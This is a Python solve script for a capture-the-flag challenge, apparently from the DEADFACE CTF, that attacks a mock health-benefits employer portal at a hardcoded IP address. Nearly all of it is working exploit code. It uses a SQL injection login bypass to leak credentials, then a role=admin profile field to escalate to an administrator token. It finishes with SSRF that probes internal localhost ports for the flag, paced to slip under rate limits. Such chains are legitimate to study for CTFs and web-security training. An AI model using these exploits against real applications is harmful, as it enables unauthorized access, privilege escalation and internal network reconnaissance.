#!/usr/bin/env python3
"""
DEADFACE CTF - RP-01 series (4 of 4) "I Want to be a Real Boy"
Health Spark employer portal - privilege escalation + SSRF.

Chain:
  1. POST /api/login  SQLi (`' OR 1=1-- -`) discloses john.smith's row, which is
     enough to authenticate normally.
  2. POST /api/profile  re-issues a session token built from the *submitted*
     profile fields. Posting {"role":"admin"} yields an administrator JWT.
  3. POST /api/admin/fetch-photo  (now authorised) fetches an arbitrary URL from
     the app server. Pointing it at http://127.0.0.1:8080/ reaches an internal
     admin console that is not exposed publicly, and the console page carries
     the flag.

Usage:
    python solve_boy.py [base_url]

Stdlib only. Paced to stay under the 1000 req / 2 min rate limit.
"""

import base64
import http.client
import json
import re
import sys
import time
import urllib.parse

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://45.79.200.170:3000").rstrip("/")
P = urllib.parse.urlparse(BASE)
HOST, PORT = P.hostname, (P.port or 80)

FLAG_RE = re.compile(r"deadface\{[^}]*\}")
PACE = 0.4
conn = http.client.HTTPConnection(HOST, PORT, timeout=20)


def http(method, path, body=None, token=None):
    global conn
    data = json.dumps(body).encode() if body is not None else None
    headers = {}
    if data:
        headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = "Bearer " + token
    for _ in range(4):
        try:
            conn.request(method, path, body=data, headers=headers)
            r = conn.getresponse()
            raw = r.read()
            status = r.status
            time.sleep(PACE)
            if status == 429 or b"Temporarily blocked" in raw:
                print("    ! rate limited, cooling down 70s")
                time.sleep(70)
                continue
            try:
                return status, json.loads(raw)
            except json.JSONDecodeError:
                return status, {"_raw": raw.decode("utf-8", "replace")}
        except Exception:
            try:
                conn.close()
            except Exception:
                pass
            conn = http.client.HTTPConnection(HOST, PORT, timeout=20)
            time.sleep(1)
    return 0, {}


def jwt_claims(tok):
    payload = tok.split(".")[1]
    payload += "=" * (-len(payload) % 4)
    return json.loads(base64.urlsafe_b64decode(payload))


def get_user_token():
    print("[*] Stage 1 - credentials via /api/login SQLi")
    st, d = http("POST", "/api/login", {"username": "' OR 1=1-- -", "password": "x"})
    user, pw = d.get("username"), d.get("password")
    if not user:
        sys.exit("    [-] disclosure failed: %s" % d)
    print("    [+] %s / %s" % (user, pw))

    st, d = http("POST", "/api/login", {"username": user, "password": pw})
    if not d.get("token"):
        sys.exit("    [-] login failed: %s" % d)
    print("    [+] session role=%s" % jwt_claims(d["token"]).get("role"))
    return d["token"], d.get("name", "John Smith")


def escalate(token, name):
    print("[*] Stage 2 - POST /api/profile with role=admin")
    st, d = http("POST", "/api/profile", {"name": name, "role": "admin"}, token=token)
    tok = d.get("token")
    if not tok:
        sys.exit("    [-] profile update did not return a token: %s" % d)
    claims = jwt_claims(tok)
    print("    [+] new token claims: %s" % json.dumps(claims))
    if claims.get("role") != "admin":
        sys.exit("    [-] role escalation failed (role=%r)" % claims.get("role"))
    return tok


def ssrf(token, url):
    st, d = http("POST", "/api/admin/fetch-photo", {"url": url}, token=token)
    return st, d.get("_raw", json.dumps(d))


def main():
    print("=" * 70)
    print(" RP-01 (4/4) - I Want to be a Real Boy")
    print(" target: %s" % BASE)
    print("=" * 70)
    tok, name = get_user_token()
    admin = escalate(tok, name)

    print("[*] Stage 3 - SSRF into the internal network")
    st, body = ssrf(admin, "http://127.0.0.1:%d/" % PORT)
    print("    [*] 127.0.0.1:%d -> HTTP %s (%d bytes)" % (PORT, st, len(body)))

    target = None
    for port in (8080, 8081, 3001, 5000, 8000, 9000):
        st, body = ssrf(admin, "http://127.0.0.1:%d/" % port)
        hit = FLAG_RE.search(body)
        label = "console" if "Admin Console" in body else ""
        print("    [*] 127.0.0.1:%-5d -> HTTP %s %-8s %s"
              % (port, st, label, (hit.group(0) if hit else "")))
        if hit:
            target, body = port, body
            break

    print("\n" + "=" * 70)
    if target:
        print(" FLAG: %s" % FLAG_RE.search(body).group(0))
        print(" via SSRF -> http://127.0.0.1:%d/" % target)
        print(" >>> SUBMIT: %s" % FLAG_RE.search(body).group(0))
    else:
        print(" no flag found on the probed internal ports")
    print("=" * 70)


if __name__ == "__main__":
    main()
